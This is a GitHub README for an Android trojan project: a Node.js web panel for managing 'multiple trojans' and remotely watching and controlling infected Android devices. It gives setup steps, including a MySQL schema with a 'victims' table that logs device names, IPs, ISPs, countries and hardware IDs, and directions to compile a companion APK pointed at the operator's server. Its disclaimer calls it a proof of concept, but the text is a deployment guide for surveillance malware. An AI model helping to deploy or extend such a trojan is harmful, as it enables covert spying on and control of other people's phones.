# Android-Trojan-2.0
>This project is heavily based on the work of [shivamsuyal](https://github.com/shivamsuyal/Android-Trojan-2.0/). This repository has been significantly modified to suit the current project's needs.
## What's Cooking?
**Web Magic**: We've slapped on a slick web UI that lets you wrangle multiple trojans like a boss. It's like Trojan control on steroids – but legal, you know?

**Android Puppetry**: Not just eye candy! it lets you not only peep but also pull the strings on entire Android devices. Mind-blowing, right?

**Tricky Business**: We threw in some ninja moves and exploited a few things just to make this cooler than your average malware. Wanna know the secrets? Check out the code – it's like a hacker's playground.

> Disclaimer: This is just a cheeky proof of concept. It's here to remind you that apps with too many permissions can be nosy neighbors. Watch your back and keep it safe out there!

## How to Use

1. **Install Node Packages:**
    - Open a terminal and navigate to the project directory.
    - Run the command `npm install` to install all the necessary Node packages.

2. **Install MySQL:**
    - Make sure you have MySQL installed on your system. If not, follow the official MySQL installation guide for your operating system.

2. **Configure MySQL Database:**
    - Open the [`dbConfig.js`](https://github.com/IniGisah/Android-Log/blob/main/modules/dbConfig.js) file located in the `modules` folder.
    - Update the database configuration settings according to your MySQL setup.
    - Save the changes.

```sql
-- Victims Table
CREATE TABLE `victims` (
  `ID` varchar(255) NOT NULL,
  `DeviceName` varchar(300) NOT NULL,
  `Country` varchar(255) DEFAULT NULL,
  `ISP` varchar(255) DEFAULT NULL,
  `IP` varchar(255) DEFAULT NULL,
  `Brand` varchar(255) DEFAULT NULL,
  `Model` varchar(255) DEFAULT NULL,
  `Manufacture` varchar(255) DEFAULT NULL,
  `HWID` varchar(300) NOT NULL,
  `isOnline` tinyint(1) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Active User
CREATE TABLE activeuser (
  id BIGINT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(255) NULL,
  password VARCHAR(255) NULL,
  name VARCHAR(255) NULL
) ENGINE=InnoDB;
```

5.  **Enter Data in ActiveUser Table:**
    *   Populate the `activeuser` table with your login details.
    ```sql
    INSERT INTO activeuser (username, password, name) VALUES ('johnDoe', 'myPassword', 'John Doe');
    ```

### Getting Ready
1.  **Install Node Packages:**
    *   Run `npm install` to grab all the necessary Node packages.

2.  **APK File**
    *   The apk source is on the another repository on this link : [ActivMon](https://github.com/IniGisah/ActivMon)
    * Before using apk, edit your server where you run this  on [string.xml](https://github.com/IniGisah/ActivMon/blob/master/app/src/main/res/values/strings.xml) file, and compile using gradle or Android Studio

### Unleash the Drama
1.  **Run the Node App:**
    *   Execute `node server.js` in your terminal.

2.  **Login to the UI:**
    *   Navigate to the provided UI link and log in using your credentials.

## Credits

This project is based on the work of [shivamsuyal](https://github.com/shivamsuyal/Android-Trojan-2.0/)


